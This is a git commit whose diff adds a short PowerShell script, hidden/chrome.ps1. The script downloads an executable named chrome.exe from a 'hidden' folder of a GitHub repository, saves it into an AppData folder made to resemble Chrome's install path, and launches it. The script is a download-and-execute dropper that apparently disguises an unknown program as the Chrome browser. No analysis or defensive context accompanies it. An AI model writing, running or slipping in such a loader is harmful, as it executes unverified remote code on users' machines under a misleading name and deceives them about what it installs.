9849f163bfccdb513b649a1659b2051c4806c15f
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-18 19:11:36 +0300

    Create chrome.ps1

---
+++ hidden/chrome.ps1
@@ -0,0 +1,11 @@
+$url = "https://github.com/webntdev/webntdev.github.io/raw/main/hidden/chrome.exe"
+$destinationPath = "$env:USERPROFILE\AppData\Google\Chrome\Application"
+$exePath = Join-Path -Path $destinationPath -ChildPath "chrome.exe"
+
+if (-not (Test-Path -Path $destinationPath)) {
+    New-Item -ItemType Directory -Path $destinationPath | Out-Null
+}
+
+Invoke-WebRequest -Uri $url -OutFile $exePath
+
+Start-Process -FilePath $exePath
